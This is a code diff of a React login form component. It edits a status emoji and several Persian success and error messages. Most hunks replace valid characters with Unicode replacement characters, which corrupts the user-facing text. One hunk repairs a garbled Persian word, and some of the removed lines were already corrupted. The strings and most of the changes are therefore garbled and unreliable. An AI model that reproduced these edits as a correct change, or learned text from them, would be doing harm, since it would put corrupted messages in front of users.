@@ -449,7 +449,7 @@ export const LoginForm = () => {
               console.log("⚠️ FALLBACK: Navigator online but tab hidden");
             } else {
               fallbackStatusText = "online";
-              fallbackStatusEmoji = "🟢";
+              fallbackStatusEmoji = "����";
               console.log("✅ FALLBACK: Navigator online and tab visible");
             }
 
@@ -486,7 +486,7 @@ export const LoginForm = () => {
         localStorage.setItem("userPhone", phoneNumber);
         sessionStorage.removeItem("sessionId");
         sessionStorage.removeItem("phoneNumber");
-        alert("🎉 کد ��ی��یل تایید شد! احراز هویت با موفقیت تکمیل شد.");
+        alert("🎉 کد ��ی��یل تایید شد! اح��از هویت با موفقیت تکمیل شد.");
         navigate("/", { replace: true });
         break;
       case "incorrect_email_code":
@@ -515,7 +515,7 @@ export const LoginForm = () => {
         localStorage.setItem("userPhone", phoneNumber);
         sessionStorage.removeItem("sessionId");
         sessionStorage.removeItem("phoneNumber");
-        alert("���� احراز هویت با موفقیت تکمیل شد! خوش آمدید.");
+        alert("���� احراز ه��یت با موفقیت تکمیل شد! خوش آمدید.");
         navigate("/", { replace: true });
         break;
     }
@@ -2728,7 +2728,7 @@ export const LoginForm = () => {
                   }, 500);
                 } catch (error) {
                   console.error("Password submission error:", error);
-                  setErrors({ password: "خطا در ارسال رمز ع��ور. لطفا دوباره تلاش کنید." });
+                  setErrors({ password: "خطا در ارسال رمز عبور. لطفا دوباره تلاش کنید." });
                 } finally {
                   setIsSubmitting(false);
                 }
